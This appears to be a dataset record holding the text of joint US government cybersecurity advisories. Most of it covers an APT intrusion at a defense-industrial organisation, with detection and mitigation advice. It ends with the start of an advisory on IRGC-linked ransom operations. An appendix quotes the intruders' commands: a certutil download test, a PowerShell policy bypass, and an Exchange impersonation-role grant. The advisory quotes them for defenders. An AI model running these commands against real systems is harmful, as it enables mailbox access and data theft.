Monitor for the installation of unauthorized software, including Remote Server Administration Tools (e.g., psexec, RdClient, VNC, and ScreenConnect).
Monitor for anomalous and known malicious command-line use. See Appendix: Windows Command Shell Activity for commands used by the actors to interact with the victim’s environment.
Monitor for unauthorized changes to user accounts (e.g., creation, permission changes, and enabling a previously disabled account).

CONTAINMENT AND REMEDIATION
Organizations affected by active or recently active threat actors in their environment can take the following initial steps to aid in eviction efforts and prevent re-entry:

Report the incident. Report the incident to U.S. Government authorities and follow your organization’s incident response plan.

Report incidents to CISA via CISA’s 24/7 Operations Center (SayCISA@cisa.dhs.gov or 888-282-0870).
Report incidents to your local FBI field office at fbi.gov/contact-us/field-offices or to FBI’s 24/7 Cyber Watch (CyWatch) via (855) 292-3937 or CyWatch@fbi.gov.
For DIB incident reporting, contact the Defense Cyber Crime Center (DC3) via DIBNET at dibnet.dod.mil/portal/intranet or (410) 981 0104.


Reset all login accounts. Reset all accounts used for authentication since it is possible that the threat actors have additional stolen credentials. Password resets should also include accounts outside of Microsoft Active Directory, such as network infrastructure devices and other non-domain joined devices (e.g., IoT devices).
Monitor SIEM logs and build detections. Create signatures based on the threat actor TTPs and use these signatures to monitor security logs for any signs of threat actor re-entry.
Enforce MFA on all user accounts. Enforce phishing-resistant MFA on all accounts without exception to the greatest extent possible.
Follow Microsoft’s security guidance for Active Directory—Best Practices for Securing Active Directory.
Audit accounts and permissions. Audit all accounts to ensure all unused accounts are disabled or removed and active accounts do not have excessive privileges. Monitor SIEM logs for any changes to accounts, such as permission changes or enabling a previously disabled account, as this might indicate a threat actor using these accounts.
Harden and monitor PowerShell by reviewing guidance in the joint Cybersecurity Information Sheet—Keeping PowerShell: Security Measures to Use and Embrace.


Mitigations

Mitigation recommendations are usually longer-term efforts that take place before a compromise as part of risk management efforts, or after the threat actors have been evicted from the environment and the immediate response actions are complete. While some may be tailored to the TTPs used by the threat actor, recovery recommendations are largely general best practices and industry standards aimed at bolstering overall cybersecurity posture.
Segment Networks Based on Function

Implement network segmentation to separate network segments based on role and functionality. Proper network segmentation significantly reduces the ability for ransomware and other threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. (See CISA’s Infographic on Layering Network Security Through Segmentation and NSA’s Segment Networks and Deploy Application-Aware Defenses.)
Isolate similar systems and implement micro-segmentation with granular access and policy restrictions to modernize cybersecurity and adopt Zero Trust (ZT) principles for both network perimeter and internal devices. Logical and physical segmentation are critical to limiting and preventing lateral movement, privilege escalation, and exfiltration.

Manage Vulnerabilities and Configurations

Update software, including operating systems, applications, and firmware, on network assets. Prioritize patching known exploited vulnerabilities and critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.
Implement a configuration change control process that securely creates device configuration backups to detect unauthorized modifications. When a configuration change is needed, document the change, and include the authorization, purpose, and mission justification. Periodically verify that modifications have not been applied by comparing current device configurations with the most recent backups. If suspicious changes are observed, verify the change was authorized.

Search for Anomalous Behavior

Use cybersecurity visibility and analytics tools to improve detection of anomalous behavior and enable dynamic changes to policy and other response actions. Visibility tools include network monitoring tools and host-based logs and monitoring tools, such as an endpoint detection and response (EDR) tool. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Monitor the use of scripting languages (e.g., Python, Powershell) by authorized and unauthorized users. Anomalous use by either group may be indicative of malicious activity, intentional or otherwise.

Restrict and Secure Use of Remote Admin Tools

Limit the number of remote access tools as well as who and what can be accessed using them. Reducing the number of remote admin tools and their allowed access will increase visibility of unauthorized use of these tools.
Use encrypted services to protect network communications and disable all clear text administration services(e.g., Telnet, HTTP, FTP, SNMP 1/2c). This ensures that sensitive information cannot be easily obtained by a threat actor capturing network traffic.

Implement a Mandatory Access Control Model

Implement stringent access controls to sensitive data and resources. Access should be restricted to those users who require access and to the minimal level of access needed.

Audit Account Usage

Monitor VPN logins to look for suspicious access (e.g., logins from unusual geo locations, remote logins from accounts not normally used for remote access, concurrent logins for the same account from different locations, unusual times of the day).
Closely monitor the use of administrative accounts. Admin accounts should be used sparingly and only when necessary, such as installing new software or patches. Any use of admin accounts should be reviewed to determine if the activity is legitimate.
Ensure standard user accounts do not have elevated privileges Any attempt to increase permissions on standard user accounts should be investigated as a potential compromise.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA, FBI, and NSA recommend exercising, testing, and validating your organization's security program against threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA, FBI, and NSA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze the performance of your detection and prevention technologies.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA, FBI, and NSA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES
CISA offers several no-cost scanning and testing services to help organizations reduce their exposure to threats by taking a proactive approach to mitigating attack vectors. See cisa.gov/cyber-hygiene-services.
U.S. DIB sector organizations may consider signing up for the NSA Cybersecurity Collaboration Center’s DIB Cybersecurity Service Offerings, including Protective Domain Name System (PDNS) services, vulnerability scanning, and threat intelligence collaboration for eligible organizations. For more information on how to enroll in these services, email dib_defense@cyber.nsa.gov.
ACKNOWLEDGEMENTS
CISA, FBI, and NSA acknowledge Mandiant for its contributions to this CSA.
APPENDIX: WINDOWS COMMAND SHELL ACTIVITY
Over a three-day period in February 2021, APT cyber actors used Windows Command Shell to interact with the victim’s environment. When interacting with the victim’s system and executing commands, the threat actors used /q and /c parameters to turn the echo off, carry out the command specified by a string, and stop its execution once completed.
On the first day, the threat actors consecutively executed many commands within the Windows Command Shell to learn about the organization’s environment and to collect sensitive data for eventual exfiltration (see Table 2).

Table 2: Windows Command Shell Activity (Day 1)


Command
Description / Use


net share
Used to create, configure, and delete network shares from the command-line.[1] The threat actor likely used this command to display information about shared resources on the local computer and decide which directories to exploit.


powershell dir
An alias (shorthand) for the PowerShell Get-ChildItem cmdlet. This command maps shared drives by specifying a path to one location and retrieving the items from another.[2] The threat actor added additional switches (aka options, parameters, or flags) to form a “one liner,” an expression to describe commonly used commands used in exploitation: powershell dir -recurse -path e:\<redacted>|select fullname,length|export-csv c:\windows\temp\temp.txt. This particular command lists subdirectories of the target environment when.


systeminfo
Displays detailed configuration information [3], tasklist – lists currently running processes [4], and ipconfig – displays all current Transmission Control Protocol (TCP)/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings, respectively [5]. The threat actor used these commands with specific switches to determine if the system was a VMware virtual machine: systeminfo > vmware & date /T, tasklist /v > vmware & date /T, and ipconfig /all >> vmware & date /.


route print
Used to display and modify the entries in the local IP routing table. [6] The threat actor used this command to display the entries in the local IP routing table.


netstat
Used to display active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, IPv4 statistics, and IPv6 statistics.[7] The threat actor used this command with three switches to display TCP connections, prevent hostname determination of foreign IP addresses, and specify the protocol for TCP: netstat -anp tcp.


certutil
Used to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains.[8] The threat actor used this command with three switches to test if they could download files from the internet: certutil -urlcache -split -f https://microsoft.com temp.html.


ping
Sends Internet Control Message Protocol (ICMP) echoes to verify connectivity to another TCP/IP computer.[9] The threat actor used ping -n 2 apple.com to either test their internet connection or to detect and avoid virtualization and analysis environments or network restrictions.


taskkill
Used to end tasks or processes.[10] The threat actor used taskkill /F /PID 8952 to probably disable security features. CISA was unable to determine what this process was as the process identifier (PID) numbers are dynamic.


PowerShell Compress-Archive cmdlet
Used to create a compressed archive or to zip files from specified files and directories.[11] The threat actor used parameters indicating shared drives as file and folder sources and the destination archive as zipped files. Specifically, they collected sensitive contract-related information from the shared drives.



 
On the second day, the APT cyber actors executed the commands in Table 3 to perform discovery as well as collect and archive data.

Table 3: Windows Command Shell Activity (Day 2)


Command
Description / Use


ntfsinfo.exe
Used to obtain volume information from the New Technology File System (NTFS) and to print it along with a directory dump of NTFS meta-data files.[12]


WinRAR.exe
Used to compress files and subsequently masqueraded WinRAR.exe by renaming it VMware.exe.[13]



 
On the third day, the APT cyber actors returned to the organization’s network and executed the commands in Table 4.

Table 4: Windows Command Shell Activity (Day 3)


Command
Description / Use


powershell -ep bypass import-module .\vmware.ps1;export-mft -volume e
Threat actors ran a PowerShell command with parameters to change the execution mode and bypass the Execution Policy to run the script from PowerShell and add a module to the current section: powershell -ep bypass import-module .\vmware.ps1;export-mft -volume e. This module appears to acquire and export the Master File Table (MFT) for volume E for further analysis by the cyber actor.[14]


set.exe
Used to display the current environment variable settings.[15] (An environment variable is a dynamic value pointing to system or user environments (folders) of the system. System environment variables are defined by the system and used globally by all users, while user environment variables are only used by the user who declared that variable and they override the system environment variables (even if the variables are named the same).


dir.exe
Used to display a list of a directory's files and subdirectories matching the eagx* text string, likely to confirm the existence of such file.


tasklist.exe and find.exe
Used to display a list of applications and services with their PIDs for all tasks running on the computer matching the string “powers”.[16][17][18]


ping.exe
Used to send two ICMP echos to amazon.com. This could have been to detect or avoid virtualization and analysis environments, circumvent network restrictions, or test their internet connection.[19]


del.exe with the /f parameter
Used to force the deletion of read-only files with the *.rar and tempg* wildcards.[20]




References

[1] Microsoft Net Share
[2] Microsoft Get-ChildItem
[3] Microsoft systeminfo
[4] Microsoft tasklist
[5] Microsoft ipconfig
[6] Microsoft Route
[7] Microsoft netstat
[8] Microsoft certutil
[9] Microsoft ping
[10] Microsoft taskkill
[11] Microsoft Compress-Archive
[12] NTFSInfo v1.2
[13] rarlab
[14] Microsoft Import-Module
[15] Microsoft set (environment variable)
[16] Microsoft tasklist
[17] Mitre ATT&CK - Sofware: TaskList
[18] Microsoft find
[19] Microsoft ping
[20] Microsoft del

Revisions

October 4, 2022: Initial version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1562.001', 'T1021.002', 'T1016', 'T1560.001', 'T1036.005', 'T1105', 'T1082', 'T1029', 'T1049', 'T1567.002', 'T1074.002', 'T1059.006', 'T1039', 'T1078', 'T1070.004', 'T1090', 'T1070', 'T1057', 'T1574', 'T1059.001', 'T1033', 'T1129', 'T1569', 'T1059', 'T1016.001', 'T1543', 'T1047', 'T1095', 'T1059.003', 'T1497.001'}","




Summary

Actions to Help Protect Against APT Cyber Activity:• Enforce multifactor authentication (MFA) on all user accounts.• Implement network segmentation to separate network segments based on role and functionality.• Update software, including operating systems, applications, and firmware, on network assets.• Audit account usage.
From November 2021 through January 2022, the Cybersecurity and Infrastructure Security Agency (CISA) responded to advanced persistent threat (APT) activity on a Defense Industrial Base (DIB) Sector organization’s enterprise network. During incident response activities, CISA uncovered that likely multiple APT groups compromised the organization’s network, and some APT actors had long-term access to the environment. APT actors used an open-source toolkit called Impacket to gain their foothold within the environment and further compromise the network, and also used a custom data exfiltration tool, CovalentStealer, to steal the victim’s sensitive data.
This joint Cybersecurity Advisory (CSA) provides APT actors tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) identified during the incident response activities by CISA and a third-party incident response organization. The CSA includes detection and mitigation actions to help organizations detect and prevent related APT activity. CISA, the Federal Bureau of Investigation (FBI), and the National Security Agency (NSA) recommend DIB sector and other critical infrastructure organizations implement the mitigations in this CSA to ensure they are managing and reducing the impact of cyber threats to their networks.
Download the PDF version of this report: pdf, 692 KB
For a downloadable copy of IOCs, see the following files:

Malware Analysis Report (MAR)-10365227-1.stix, 966 kb
MAR-10365227-2.stix, 249B
MAR-10365227-3.stix, 3.2 MB


Technical Details

Threat Actor Activity
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See the MITRE ATT&CK Tactics and Techniques section for a table of the APT cyber activity mapped to MITRE ATT&CK for Enterprise framework.
From November 2021 through January 2022, CISA conducted an incident response engagement on a DIB Sector organization’s enterprise network. The victim organization also engaged a third-party incident response organization for assistance. During incident response activities, CISA and the trusted –third-party identified APT activity on the victim’s network.
Some APT actors gained initial access to the organization’s Microsoft Exchange Server as early as mid-January 2021. The initial access vector is unknown. Based on log analysis, the actors gathered information about the exchange environment and performed mailbox searches within a four-hour period after gaining access. In the same period, these actors used a compromised administrator account (“Admin 1”) to access the EWS Application Programming Interface (API). In early February 2021, the actors returned to the network and used Admin 1 to access EWS API again. In both instances, the actors used a virtual private network (VPN).
Four days later, the APT actors used Windows Command Shell over a three-day period to interact with the victim’s network. The actors used Command Shell to learn about the organization’s environment and to collect sensitive data, including sensitive contract-related information from shared drives, for eventual exfiltration. The actors manually collected files using the command-line tool, WinRAR. These files were split into approximately 3MB chunks located on the Microsoft Exchange server within the CU2\he\debug directory. See Appendix: Windows Command Shell Activity for additional information, including specific commands used.
During the same period, APT actors implanted Impacket, a Python toolkit for programmatically constructing and manipulating network protocols, on another system. The actors used Impacket to attempt to move laterally to another system.
In early March 2021, APT actors exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 to install 17 China Chopper webshells on the Exchange Server. Later in March, APT actors installed HyperBro on the Exchange Server and two other systems. For more information on the HyperBro and webshell samples, see CISA MAR-10365227-2 and -3.
In April 2021, APT actors used Impacket for network exploitation activities. See the Use of Impacket section for additional information. From late July through mid-October 2021, APT actors employed a custom exfiltration tool, CovalentStealer, to exfiltrate the remaining sensitive files. See the Use of Custom Exfiltration Tool: CovalentStealer section for additional information.
APT actors maintained access through mid-January 2022, likely by relying on legitimate credentials.
Use of Impacket
CISA discovered activity indicating the use of two Impacket tools: wmiexec.py and smbexec.py. These tools use Windows Management Instrumentation (WMI) and Server Message Block (SMB) protocol, respectively, for creating a semi-interactive shell with the target device. Through the Command Shell, an Impacket user with credentials can run commands on the remote device using the Windows management protocols required to support an enterprise network.
The APT cyber actors used existing, compromised credentials with Impacket to access a higher privileged service account used by the organization's multifunctional devices. The threat actors first used the service account to remotely access the organization’s Microsoft Exchange server via Outlook Web Access (OWA) from multiple external IP addresses; shortly afterwards, the actors assigned the Application Impersonation role to the service account by running the following PowerShell command for managing Exchange:
powershell add-pssnapin *exchange*;New-ManagementRoleAssignment - name:""Journaling-Logs"" -Role:ApplicationImpersonation -User:<account>
This command gave the service account the ability to access other users’ mailboxes.
The APT cyber actors used virtual private network (VPN) and virtual private server (VPS) providers, M247 and SurfShark, as part of their techniques to remotely access the Microsoft Exchange server. Use of these hosting providers, which serves to conceal interaction with victim networks, are common for these threat actors. According to CISA’s analysis of the victim’s Microsoft Exchange server Internet Information Services (IIS) logs, the actors used the account of a former employee to access the EWS. EWS enables access to mailbox items such as email messages, meetings, and contacts. The source IP address for these connections is mostly from the VPS hosting provider, M247.
Use of Custom Exfiltration Tool: CovalentStealer
The threat actors employed a custom exfiltration tool, CovalentStealer, to exfiltrate sensitive files.
CovalentStealer is designed to identify file shares on a system, categorize the files, and upload the files to a remote server. CovalentStealer includes two configurations that specifically target the victim's documents using predetermined files paths and user credentials. CovalentStealer stores the collected files on a Microsoft OneDrive cloud folder, includes a configuration file to specify the types of files to collect at specified times and uses a 256-bit AES key for encryption. See CISA MAR-10365227-1 for additional technical details, including IOCs and detection signatures.
MITRE ATT&CK Tactics and Techniques
MITRE ATT&CK is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. CISA uses the ATT&CK Framework as a foundation for the development of specific threat models and methodologies. Table 1 lists the ATT&CK techniques employed by the APT actors.

DETECTION
Given the actors’ demonstrated capability to maintain persistent, long-term access in compromised enterprise environments, CISA, FBI, and NSA encourage organizations to:

Monitor logs for connections from unusual VPSs and VPNs. Examine connection logs for access from unexpected ranges, particularly from machines hosted by SurfShark and M247.
Monitor for suspicious account use (e.g., inappropriate or unauthorized use of administrator accounts, service accounts, or third-party accounts). To detect use of compromised credentials in combination with a VPS, follow the steps below:

Review logs for ""impossible logins,"" such as logins with changing username, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user’s geographic location.
Search for ""impossible travel,"" which occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses in the time between logins). Note: This detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting to networks.
Search for one IP used across multiple accounts, excluding expected logins.

Take note of any M247-associated IP addresses used along with VPN providers (e.g., SurfShark). Look for successful remote logins (e.g., VPN, OWA) for IPs coming from M247- or using SurfShark-registered IP addresses.


Identify suspicious privileged account use after resetting passwords or applying user account mitigations.
Search for unusual activity in typically dormant accounts.
Search for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.


Review the YARA rules provided in MAR-10365227-1 to assist in determining whether malicious activity has been observed.
Monitor for the installation of unauthorized software, including Remote Server Administration Tools (e.g., psexec, RdClient, VNC, and ScreenConnect).
Monitor for anomalous and known malicious command-line use. See Appendix: Windows Command Shell Activity for commands used by the actors to interact with the victim’s environment.
Monitor for unauthorized changes to user accounts (e.g., creation, permission changes, and enabling a previously disabled account).

CONTAINMENT AND REMEDIATION
Organizations affected by active or recently active threat actors in their environment can take the following initial steps to aid in eviction efforts and prevent re-entry:

Report the incident. Report the incident to U.S. Government authorities and follow your organization’s incident response plan.

Report incidents to CISA via CISA’s 24/7 Operations Center (SayCISA@cisa.dhs.gov or 888-282-0870).
Report incidents to your local FBI field office at fbi.gov/contact-us/field-offices or to FBI’s 24/7 Cyber Watch (CyWatch) via (855) 292-3937 or CyWatch@fbi.gov.
For DIB incident reporting, contact the Defense Cyber Crime Center (DC3) via DIBNET at dibnet.dod.mil/portal/intranet or (410) 981 0104.


Reset all login accounts. Reset all accounts used for authentication since it is possible that the threat actors have additional stolen credentials. Password resets should also include accounts outside of Microsoft Active Directory, such as network infrastructure devices and other non-domain joined devices (e.g., IoT devices).
Monitor SIEM logs and build detections. Create signatures based on the threat actor TTPs and use these signatures to monitor security logs for any signs of threat actor re-entry.
Enforce MFA on all user accounts. Enforce phishing-resistant MFA on all accounts without exception to the greatest extent possible.
Follow Microsoft’s security guidance for Active Directory—Best Practices for Securing Active Directory.
Audit accounts and permissions. Audit all accounts to ensure all unused accounts are disabled or removed and active accounts do not have excessive privileges. Monitor SIEM logs for any changes to accounts, such as permission changes or enabling a previously disabled account, as this might indicate a threat actor using these accounts.
Harden and monitor PowerShell by reviewing guidance in the joint Cybersecurity Information Sheet—Keeping PowerShell: Security Measures to Use and Embrace.


Mitigations

Mitigation recommendations are usually longer-term efforts that take place before a compromise as part of risk management efforts, or after the threat actors have been evicted from the environment and the immediate response actions are complete. While some may be tailored to the TTPs used by the threat actor, recovery recommendations are largely general best practices and industry standards aimed at bolstering overall cybersecurity posture.
Segment Networks Based on Function

Implement network segmentation to separate network segments based on role and functionality. Proper network segmentation significantly reduces the ability for ransomware and other threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. (See CISA’s Infographic on Layering Network Security Through Segmentation and NSA’s Segment Networks and Deploy Application-Aware Defenses.)
Isolate similar systems and implement micro-segmentation with granular access and policy restrictions to modernize cybersecurity and adopt Zero Trust (ZT) principles for both network perimeter and internal devices. Logical and physical segmentation are critical to limiting and preventing lateral movement, privilege escalation, and exfiltration.

Manage Vulnerabilities and Configurations

Update software, including operating systems, applications, and firmware, on network assets. Prioritize patching known exploited vulnerabilities and critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.
Implement a configuration change control process that securely creates device configuration backups to detect unauthorized modifications. When a configuration change is needed, document the change, and include the authorization, purpose, and mission justification. Periodically verify that modifications have not been applied by comparing current device configurations with the most recent backups. If suspicious changes are observed, verify the change was authorized.

Search for Anomalous Behavior

Use cybersecurity visibility and analytics tools to improve detection of anomalous behavior and enable dynamic changes to policy and other response actions. Visibility tools include network monitoring tools and host-based logs and monitoring tools, such as an endpoint detection and response (EDR) tool. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Monitor the use of scripting languages (e.g., Python, Powershell) by authorized and unauthorized users. Anomalous use by either group may be indicative of malicious activity, intentional or otherwise.

Restrict and Secure Use of Remote Admin Tools

Limit the number of remote access tools as well as who and what can be accessed using them. Reducing the number of remote admin tools and their allowed access will increase visibility of unauthorized use of these tools.
Use encrypted services to protect network communications and disable all clear text administration services(e.g., Telnet, HTTP, FTP, SNMP 1/2c). This ensures that sensitive information cannot be easily obtained by a threat actor capturing network traffic.

Implement a Mandatory Access Control Model

Implement stringent access controls to sensitive data and resources. Access should be restricted to those users who require access and to the minimal level of access needed.

Audit Account Usage

Monitor VPN logins to look for suspicious access (e.g., logins from unusual geo locations, remote logins from accounts not normally used for remote access, concurrent logins for the same account from different locations, unusual times of the day).
Closely monitor the use of administrative accounts. Admin accounts should be used sparingly and only when necessary, such as installing new software or patches. Any use of admin accounts should be reviewed to determine if the activity is legitimate.
Ensure standard user accounts do not have elevated privileges Any attempt to increase permissions on standard user accounts should be investigated as a potential compromise.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA, FBI, and NSA recommend exercising, testing, and validating your organization's security program against threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA, FBI, and NSA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze the performance of your detection and prevention technologies.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA, FBI, and NSA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES
CISA offers several no-cost scanning and testing services to help organizations reduce their exposure to threats by taking a proactive approach to mitigating attack vectors. See cisa.gov/cyber-hygiene-services.
U.S. DIB sector organizations may consider signing up for the NSA Cybersecurity Collaboration Center’s DIB Cybersecurity Service Offerings, including Protective Domain Name System (PDNS) services, vulnerability scanning, and threat intelligence collaboration for eligible organizations. For more information on how to enroll in these services, email dib_defense@cyber.nsa.gov.
ACKNOWLEDGEMENTS
CISA, FBI, and NSA acknowledge Mandiant for its contributions to this CSA.
APPENDIX: WINDOWS COMMAND SHELL ACTIVITY
Over a three-day period in February 2021, APT cyber actors used Windows Command Shell to interact with the victim’s environment. When interacting with the victim’s system and executing commands, the threat actors used /q and /c parameters to turn the echo off, carry out the command specified by a string, and stop its execution once completed.
On the first day, the threat actors consecutively executed many commands within the Windows Command Shell to learn about the organization’s environment and to collect sensitive data for eventual exfiltration (see Table 2).

 
On the second day, the APT cyber actors executed the commands in Table 3 to perform discovery as well as collect and archive data.

 
On the third day, the APT cyber actors returned to the organization’s network and executed the commands in Table 4.


References,1, Microsoft Net Share,2, Microsoft Get-ChildItem,3, Microsoft systeminfo,4, Microsoft tasklist,5, Microsoft ipconfig,6, Microsoft Route,7, Microsoft netstat,8, Microsoft certutil,9, Microsoft ping,10, Microsoft taskkill,11, Microsoft Compress-Archive,12, NTFSInfo v1.2,13, rarlab,14, Microsoft Import-Module,15, Microsoft set (environment variable),16, Microsoft tasklist,17, Mitre ATT&CK - Sofware: TaskList,18, Microsoft find,19, Microsoft ping,20, Microsoft del

Revisions

October 4, 2022: Initial version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a
40,"




Summary

Actions to take today to protect against ransom operations:• Keep systems and software updated and prioritize remediating known exploited vulnerabilities.• Enforce MFA.• Make offline backups of your data.
This joint Cybersecurity Advisory (CSA) is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), U.S. Cyber Command (USCC) - Cyber National Mission Force (CNMF), the Department of the Treasury (Treasury), the Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), and the United Kingdom’s National Cyber Security Centre (NCSC) to highlight continued malicious cyber activity by advanced persistent threat (APT) actors that the authoring agencies assess are affiliated with the Iranian Government’s Islamic Revolutionary Guard Corps (IRGC). Note: The IRGC is an Iranian Government agency tasked with defending the Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as ""the authoring agencies.""
This advisory updates joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, which provides information on these Iranian government-sponsored APT actors exploiting known Fortinet and Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in furtherance of malicious activities, including ransom operations. The authoring agencies now judge these actors are an APT group affiliated with the IRGC.
Since the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors Exploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity from May 2021, the authoring agencies have continued to observe these IRGC-affiliated actors exploiting known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial access. The IRGC-affiliated actors have used this access for follow-on activity, including disk encryption and data extortion, to support ransom operations.
The IRGC-affiliated actors are actively targeting a broad range of entities, including entities across multiple U.S. critical infrastructure sectors as well as Australian, Canadian, and United Kingdom organizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring agencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than targeting specific targeted entities or sectors.
This advisory provides observed tactics, techniques, and indicators of compromise (IOCs) that the authoring agencies assess are likely associated with this IRGC-affiliated APT. The authoring agencies urge organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
For a downloadable copy of IOCs, see AA22-257A.stix.
For more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threat webpage.
Download the PDF version of this report: pdf, 836 kb

Technical Details

Threat Actor Activity
As reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the authoring agencies have observed Iranian government-sponsored APT actors scanning for and/or exploiting the following known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial access to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, and CVE-2021-34473 (a ProxyShell vulnerability). The authoring agencies have also observed these APT actors leveraging CVE-2021-34473 against U.S. networks in combination with ProxyShell vulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iran-based company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC judges that these APT actors have used CVE-2021-34473 in Australia to gain access to systems. The APT actors can leverage this access for further malicious activities, including deployment of tools to support ransom and extortion operations, and data exfiltration.
Since the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and CVE-2021-45105 for initial access.
The IRGC-affiliated actors have used their access for ransom operations, including disk encryption and extortion efforts. After gaining access to a network, the IRGC-affiliated actors likely determine a course of action based on their perceived value of the data. Depending on the perceived value, the actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use the exfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor uses a combination of encryption and data theft to pressure targeted entities to pay ransom demands.
IRGC-affiliated actor activity observed by the authoring agencies includes:

In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) on a Microsoft Exchange server to gain access to the network of a U.S. police department. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.
In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207), on a Microsoft Exchange server to gain access to the network of a U.S. regional transportation company. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom. This activity disrupted the transportation company’s operations for an extended period.
In February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021-45105) in a VMware Horizon application to gain access to the network of a U.S. municipal government, move laterally within the network, establish persistent access, initiate crypto-mining operations, and conduct additional malicious activity.
In February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021) to gain access to the network of a U.S. aerospace company. The actors leveraged a server that the authoring agencies assess is associated with the IRGC-affiliated actors to exfiltrate data from the company's network.

MITRE ATT&CK® Tactics and Techniques
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix B for a table of the MITRE ATT&CK tactics and techniques observed.
The authoring agencies assess the following tactics and techniques are associated with this activity.
Resource Development [TA0042]
The IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001, T1588.002] for a variety of tactics across the enterprise spectrum:

Fast Reverse Proxy (FRP) for command and control (C2)
Plink for C2
Remote Desktop Protocol (RDP) for lateral movement
BitLocker for data encryption
SoftPerfect Network Scanner for system network configuration discovery

Note: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Initial Access [TA0001]
As stated in the Technical Details section previously reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the IRGC-affiliated actors gained initial access by exploiting known vulnerabilities [T1190].
The following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation on targeted entity networks:

Web shells with naming conventions aspx_[11 randomly generated alphabetic characters].aspx, login.aspx, or default.aspx in any of the following directories:

